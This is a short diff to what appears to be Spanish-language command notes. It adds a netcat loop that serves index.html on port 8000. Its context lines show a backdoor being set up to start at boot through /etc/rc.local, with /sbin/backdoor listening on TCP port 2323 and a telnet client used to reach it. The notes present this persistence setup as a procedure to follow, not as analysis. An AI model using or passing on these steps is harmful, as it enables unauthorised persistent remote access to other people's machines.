@@ -7,6 +7,12 @@ vi /etc/rc.local
 
 /sbin/backdoor
 
+Otros comandos:
+
+# netcat
+
+while true ; do nc -l 8000 < index.html ; done
+
 # backdoor ( Se instala como un proceso en Linux. Puerto tcp 2323 )
 
 # telnetcliente IP ( cliente telnet para acceder )
